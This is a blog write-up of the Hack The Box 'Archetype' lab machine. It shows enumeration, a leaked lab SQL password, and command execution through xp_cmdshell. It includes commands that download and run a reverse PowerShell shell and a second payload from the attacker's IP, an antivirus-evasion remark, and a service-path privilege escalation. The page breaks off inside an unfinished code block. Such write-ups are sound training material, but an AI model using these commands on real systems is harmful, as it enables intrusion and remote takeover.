@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HacktheBox - Archetype Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="HacktheBox - Archetype Writeup" />
+<meta property="og:description" content="Enumeration 1000 ports scan 1 nmap -sC -sV -oN nmap/initial 10.10.10.27 initial nmap scan all ports scan full nmap scan Open ports 135 (msrpc) 139 (smb 4 sure) 445 (smb 4 sure) 1433 (ms-sql-s/Microsoft SQL Server) SMB Enum CrackMapEXEC crackmapexec smbclient smbclient wow backups shares. Let&rsquo;s try connect to it.
+backup shares download the file using the get command prod.dtsConfig content of the file 1 2 3 4 5 6 7 8 &lt;DTSConfiguration&gt; &lt;DTSConfigurationHeading&gt; &lt;DTSConfigurationFileInfo GeneratedBy=&#34;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shafiqaiman.com/posts/htb/archetype/" /><meta property="og:image" content="https://shafiqaiman.com/posts/htb/archetype/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-07-20T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://shafiqaiman.com/posts/htb/archetype/featured.png"/>
+<meta name="twitter:title" content="HacktheBox - Archetype Writeup"/>
+<meta name="twitter:description" content="Enumeration 1000 ports scan 1 nmap -sC -sV -oN nmap/initial 10.10.10.27 initial nmap scan all ports scan full nmap scan Open ports 135 (msrpc) 139 (smb 4 sure) 445 (smb 4 sure) 1433 (ms-sql-s/Microsoft SQL Server) SMB Enum CrackMapEXEC crackmapexec smbclient smbclient wow backups shares. Let&rsquo;s try connect to it.
+backup shares download the file using the get command prod.dtsConfig content of the file 1 2 3 4 5 6 7 8 &lt;DTSConfiguration&gt; &lt;DTSConfigurationHeading&gt; &lt;DTSConfigurationFileInfo GeneratedBy=&#34;."/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/htb/archetype/" /><link rel="prev" href="https://shafiqaiman.com/posts/htb/blue/" /><link rel="next" href="https://shafiqaiman.com/posts/htb/shield/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HacktheBox - Archetype Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/shafiqaiman.com\/posts\/htb\/archetype\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/shafiqaiman.com\/posts\/htb\/archetype\/featured.png",
+                            "width":  1066 ,
+                            "height":  603 
+                        }],"genre": "posts","keywords": "reverse-powershell, legacy, smb, smbclient, crackmapexec, impacket-mssqlclient, mssql, xp_cmdshell, nishang, modify-services, windows-check-OS-architecture","wordcount":  537 ,
+        "url": "https:\/\/shafiqaiman.com\/posts\/htb\/archetype\/","datePublished": "2021-07-20T00:00:00+00:00","dateModified": "2021-07-20T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SH∆FIQ ∆IM∆N"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HacktheBox - Archetype Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HacktheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="20-07-2021">20-07-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;537 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/archetype/featured.png"
+        data-srcset="/posts/htb/archetype/featured.png, /posts/htb/archetype/featured.png 1.5x, /posts/htb/archetype/featured.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/archetype/featured.png"
+        title="/posts/htb/archetype/featured.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open ports</a></li>
+      </ul>
+    </li>
+    <li><a href="#smb-enum">SMB Enum</a>
+      <ul>
+        <li><a href="#crackmapexec">CrackMapEXEC</a></li>
+        <li><a href="#smbclient">smbclient</a></li>
+        <li><a href="#proddtsconfig">prod.dtsConfig</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a>
+      <ul>
+        <li><a href="#mssqlclientpyimpacket">mssqlclient.py[Impacket]</a></li>
+        <li><a href="#nishang">Nishang</a></li>
+      </ul>
+    </li>
+    <li><a href="#user-flag">User flag</a>
+      <ul>
+        <li><a href="#winpeas">WinPEAS</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#usosvc">UsoSvc</a></li>
+        <li><a href="#modify-service-binary-path">Modify service binary path</a></li>
+        <li><a href="#encoded-command">Encoded Command</a></li>
+      </ul>
+    </li>
+    <li><a href="#administrator-flag">Administrator Flag</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>1000 ports scan</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV -oN nmap/initial 10.10.10.27
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/archetype/1.png" title="initial nmap scan" data-thumbnail="/posts/htb/archetype/1.png" data-sub-html="<h2>initial nmap scan</h2><p>initial nmap scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/1.png"
+            data-srcset="/posts/htb/archetype/1.png, /posts/htb/archetype/1.png 1.5x, /posts/htb/archetype/1.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/1.png" width="941" height="828" />
+    </a><figcaption class="image-caption">initial nmap scan</figcaption>
+    </figure></p>
+<ul>
+<li>all ports scan</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/2.png" title="full nmap scan" data-thumbnail="/posts/htb/archetype/2.png" data-sub-html="<h2>full nmap scan</h2><p>full nmap scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/2.png"
+            data-srcset="/posts/htb/archetype/2.png, /posts/htb/archetype/2.png 1.5x, /posts/htb/archetype/2.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/2.png" width="627" height="864" />
+    </a><figcaption class="image-caption">full nmap scan</figcaption>
+    </figure></p>
+<h3 id="open-ports">Open ports</h3>
+<ul>
+<li>135 (msrpc)</li>
+<li>139 (smb 4 sure)</li>
+<li>445 (smb 4 sure)</li>
+<li>1433 (ms-sql-s/Microsoft SQL Server)</li>
+</ul>
+<h2 id="smb-enum">SMB Enum</h2>
+<h3 id="crackmapexec">CrackMapEXEC</h3>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/3.png" title="crackmapexec" data-thumbnail="/posts/htb/archetype/3.png" data-sub-html="<h2>crackmapexec</h2><p>crackmapexec</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/3.png"
+            data-srcset="/posts/htb/archetype/3.png, /posts/htb/archetype/3.png 1.5x, /posts/htb/archetype/3.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/3.png" width="627" height="117" />
+    </a><figcaption class="image-caption">crackmapexec</figcaption>
+    </figure></p>
+<h3 id="smbclient">smbclient</h3>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/4.png" title="smbclient" data-thumbnail="/posts/htb/archetype/4.png" data-sub-html="<h2>smbclient</h2><p>smbclient</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/4.png"
+            data-srcset="/posts/htb/archetype/4.png, /posts/htb/archetype/4.png 1.5x, /posts/htb/archetype/4.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/4.png" width="351" height="205" />
+    </a><figcaption class="image-caption">smbclient</figcaption>
+    </figure></p>
+<p>wow <code>backups</code> shares. Let&rsquo;s try connect to it.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/5.png" title="backup shares" data-thumbnail="/posts/htb/archetype/5.png" data-sub-html="<h2>backup shares</h2><p>backup shares</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/5.png"
+            data-srcset="/posts/htb/archetype/5.png, /posts/htb/archetype/5.png 1.5x, /posts/htb/archetype/5.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/5.png" width="623" height="222" />
+    </a><figcaption class="image-caption">backup shares</figcaption>
+    </figure></p>
+<ul>
+<li>download the file using the <code>get command</code></li>
+</ul>
+<h3 id="proddtsconfig">prod.dtsConfig</h3>
+<ul>
+<li>content of the file</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="sr">&lt;DTSConfiguration&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="sr">&lt;DTSConfigurationHeading&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">DTSConfigurationFileInfo</span> <span class="n">GeneratedBy</span><span class="o">=</span><span class="s">&#34;...&#34;</span> <span class="n">GeneratedFromPackageName</span><span class="o">=</span><span class="s">&#34;...&#34;</span> <span class="n">GeneratedFromPackageID</span><span class="o">=</span><span class="s">&#34;...&#34;</span> <span class="n">GeneratedDate</span><span class="o">=</span><span class="s">&#34;20.1.2019 10:01:34&#34;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="sr">&lt;/DTSConfigurationHeading&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">Configuration</span> <span class="n">ConfiguredType</span><span class="o">=</span><span class="s">&#34;Property&#34;</span> <span class="n">Path</span><span class="o">=</span><span class="s">&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> <span class="n">ValueType</span><span class="o">=</span><span class="s">&#34;String&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="sr">&lt;ConfiguredValue&gt;</span><span class="n">Data</span> <span class="n">Source</span><span class="o">=.</span><span class="p">;</span><span class="n">Password</span><span class="o">=</span><span class="n">M3g4c0rp123</span><span class="p">;</span><span class="n">User</span> <span class="n">ID</span><span class="o">=</span><span class="n">ARCHETYPE</span><span class="o">\</span><span class="n">sql_svc</span><span class="p">;</span><span class="n">Initial</span> <span class="n">Catalog</span><span class="o">=</span><span class="n">Catalog</span><span class="p">;</span><span class="n">Provider</span><span class="o">=</span><span class="n">SQLNCLI10</span><span class="mf">.1</span><span class="p">;</span><span class="n">Persist</span> <span class="n">Security</span> <span class="n">Info</span><span class="o">=</span><span class="n">True</span><span class="p">;</span><span class="n">Auto</span> <span class="n">Translate</span><span class="o">=</span><span class="n">False</span><span class="p">;</span><span class="sr">&lt;/ConfiguredValue&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="sr">&lt;/Configuration&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="sr">&lt;/DTSConfiguration&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>we&rsquo;ve got the credentials</p>
+<ul>
+<li><code>ARCHETYPE\sql_svc:M3g4c0rp123</code></li>
+</ul>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<h3 id="mssqlclientpyimpacket">mssqlclient.py[Impacket]</h3>
+<ul>
+<li>mssqlclient syntax</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mssqlclient.py &lt;UserID&gt;@&lt;IP addr&gt; -windows-auth
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/archetype/6.png" title="mssqlclient" data-thumbnail="/posts/htb/archetype/6.png" data-sub-html="<h2>mssqlclient</h2><p>mssqlclient</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/6.png"
+            data-srcset="/posts/htb/archetype/6.png, /posts/htb/archetype/6.png 1.5x, /posts/htb/archetype/6.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/6.png" width="787" height="482" />
+    </a><figcaption class="image-caption">mssqlclient</figcaption>
+    </figure></p>
+<ul>
+<li>always do this after login <code>enable_xp_cmdshell</code></li>
+<li>let&rsquo;s try run <code>whoami</code></li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/7.png" title="xp_cmdshell whoami" data-thumbnail="/posts/htb/archetype/7.png" data-sub-html="<h2>xp_cmdshell whoami</h2><p>xp_cmdshell whoami</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/7.png"
+            data-srcset="/posts/htb/archetype/7.png, /posts/htb/archetype/7.png 1.5x, /posts/htb/archetype/7.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/7.png" width="735" height="205" />
+    </a><figcaption class="image-caption">xp_cmdshell whoami</figcaption>
+    </figure></p>
+<ul>
+<li>Note: I&rsquo;m using <code>xp_cmdshell</code> then <code>whoami</code></li>
+</ul>
+<h3 id="nishang">Nishang</h3>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Nishang<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener noreffer ">Nishang</a> is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.</div>
+        </div>
+    </div>
+<ul>
+<li>I&rsquo;m gonna copy the <code>Invoke-PowerShellTcp.ps1</code> into my <code>www</code> directory. Then, rename it to <code>rev.ps1</code></li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/8.png" title="copy PowerShellTcp.ps1" data-thumbnail="/posts/htb/archetype/8.png" data-sub-html="<h2>copy PowerShellTcp.ps1</h2><p>copy PowerShellTcp.ps1</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/8.png"
+            data-srcset="/posts/htb/archetype/8.png, /posts/htb/archetype/8.png 1.5x, /posts/htb/archetype/8.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/8.png" width="714" height="542" />
+    </a><figcaption class="image-caption">copy PowerShellTcp.ps1</figcaption>
+    </figure></p>
+<ul>
+<li>Open the <code>rev.ps1</code> file and pick one of the example. Then <code>copy</code> and <code>paste</code> it on the last line of the code.</li>
+</ul>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Make sure! change the ip and port</div>
+        </div>
+    </div>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/9.png" title="PowerShellTcp.ps1 example" data-thumbnail="/posts/htb/archetype/9.png" data-sub-html="<h2>PowerShellTcp.ps1 example</h2><p>PowerShellTcp.ps1 example</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/9.png"
+            data-srcset="/posts/htb/archetype/9.png, /posts/htb/archetype/9.png 1.5x, /posts/htb/archetype/9.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/9.png" width="939" height="239" />
+    </a><figcaption class="image-caption">PowerShellTcp.ps1 example</figcaption>
+    </figure> <em>examples</em></p>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/10.png" title="modify PowerShellTcp.ps1" data-thumbnail="/posts/htb/archetype/10.png" data-sub-html="<h2>modify PowerShellTcp.ps1</h2><p>modify PowerShellTcp.ps1</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/10.png"
+            data-srcset="/posts/htb/archetype/10.png, /posts/htb/archetype/10.png 1.5x, /posts/htb/archetype/10.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/10.png" width="909" height="258" />
+    </a><figcaption class="image-caption">modify PowerShellTcp.ps1</figcaption>
+    </figure> <br><em>put in here and save it</em></p>
+<ul>
+<li>Time to upload the script into the machine by using <code>mssqlclient.py</code> that we connected.
+<ul>
+<li>I&rsquo;m gonna run <code>python server</code> inside <code>www</code> directory.</li>
+<li><code>python3 -m http.server</code></li>
+<li>Then try to uploaded using this command:
+<ul>
+<li><code>xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.13:8000/rev.ps1\&quot;)</code></li>
+</ul>
+</li>
+<li>And this happen</li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/11.png" title="blocked by AV" data-thumbnail="/posts/htb/archetype/11.png" data-sub-html="<h2>blocked by AV</h2><p>blocked by AV</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/11.png"
+            data-srcset="/posts/htb/archetype/11.png, /posts/htb/archetype/11.png 1.5x, /posts/htb/archetype/11.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/11.png" width="931" height="220" />
+    </a><figcaption class="image-caption">blocked by AV</figcaption>
+    </figure> <br>  <em>it says this script got blocked by antivirus because of this function</em></p>
+<ul>
+<li>So, I change the function into something else. It works.</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/12.png" title="execute again" data-thumbnail="/posts/htb/archetype/12.png" data-sub-html="<h2>execute again</h2><p>execute again</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/12.png"
+            data-srcset="/posts/htb/archetype/12.png, /posts/htb/archetype/12.png 1.5x, /posts/htb/archetype/12.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/12.png" width="1264" height="352" />
+    </a><figcaption class="image-caption">execute again</figcaption>
+    </figure></p>
+<h2 id="user-flag">User flag</h2>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/14.png" title="user flag" data-thumbnail="/posts/htb/archetype/14.png" data-sub-html="<h2>user flag</h2><p>user flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/14.png"
+            data-srcset="/posts/htb/archetype/14.png, /posts/htb/archetype/14.png 1.5x, /posts/htb/archetype/14.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/14.png" width="634" height="266" />
+    </a><figcaption class="image-caption">user flag</figcaption>
+    </figure></p>
+<h3 id="winpeas">WinPEAS</h3>
+<ul>
+<li>Upload the winpeas binary into the machine</li>
+<li>I&rsquo;m gonna use <code>powershell</code> to know this machine <code>architecture</code>
+<ul>
+<li>by using this command:
+<ul>
+<li><code>(wmic os get OSArchitecture)[2]</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/13.png" title="check OSArchitecture" data-thumbnail="/posts/htb/archetype/13.png" data-sub-html="<h2>check OSArchitecture</h2><p>check OSArchitecture</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/13.png"
+            data-srcset="/posts/htb/archetype/13.png, /posts/htb/archetype/13.png 1.5x, /posts/htb/archetype/13.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/13.png" width="546" height="109" />
+    </a><figcaption class="image-caption">check OSArchitecture</figcaption>
+    </figure></p>
+<ul>
+<li>
+<p>This machine is 64-bit. I&rsquo;m gonna upload <code>WinPEAS 64-bit version</code> to work.</p>
+</li>
+<li>
+<p>I&rsquo;m gonna <code>copy</code> and <code>paste</code> the <code>WinPEAS</code> binary into my <code>www</code> folder.</p>
+</li>
+<li>
+<p>Let&rsquo;s upload it by using this command:</p>
+<ul>
+<li><code>IWR http://10.10.16.13:8000/winPEASx64.exe -OutFile winpeas.exe</code></li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/15.png" title="download WinPEAS" data-thumbnail="/posts/htb/archetype/15.png" data-sub-html="<h2>download WinPEAS</h2><p>download WinPEAS</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/15.png"
+            data-srcset="/posts/htb/archetype/15.png, /posts/htb/archetype/15.png 1.5x, /posts/htb/archetype/15.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/15.png" width="877" height="87" />
+    </a><figcaption class="image-caption">download WinPEAS</figcaption>
+    </figure></p>
+<ul>
+<li>Then run it by using this command <code>.\winpeas.exe</code></li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="usosvc">UsoSvc</h3>
+<ul>
+<li><code>WinPEAS</code> just found this juicy stuff:</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/archetype/16.png" title="UsoSVC modify services" data-thumbnail="/posts/htb/archetype/16.png" data-sub-html="<h2>UsoSVC modify services</h2><p>UsoSVC modify services</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/archetype/16.png"
+            data-srcset="/posts/htb/archetype/16.png, /posts/htb/archetype/16.png 1.5x, /posts/htb/archetype/16.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/archetype/16.png" width="757" height="337" />
+    </a><figcaption class="image-caption">UsoSVC modify services</figcaption>
+    </figure></p>
+<h3 id="modify-service-binary-path">Modify service binary path</h3>
+<ul>
+<li>According this <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services" target="_blank" rel="noopener noreffer ">link</a></li>
+</ul>
+<blockquote>
+<p>If the group &ldquo;Authenticated users&rdquo; has <em><font color="red">SERVICE_ALL_ACCESS</font></em> in a service, then it can <font color="yellow">modify the binary</font> that is being executed by the service.</p>
+</blockquote>
+<hr>
+<h3 id="encoded-command">Encoded Command</h3>
+<ul>
+<li>Here is the script before Encoded</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">IEX</span><span class="p">(</span><span class="nb">IWR </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">16</span><span class="p">.</span><span class="mf">13</span><span class="err">:</span><span class="mf">8000</span><span class="p">/</span><span class="n">zzz</span><span class="p">.</span><span class="py">ps1</span> <span class="n">-UseBasicParsing</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Time to encoded</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
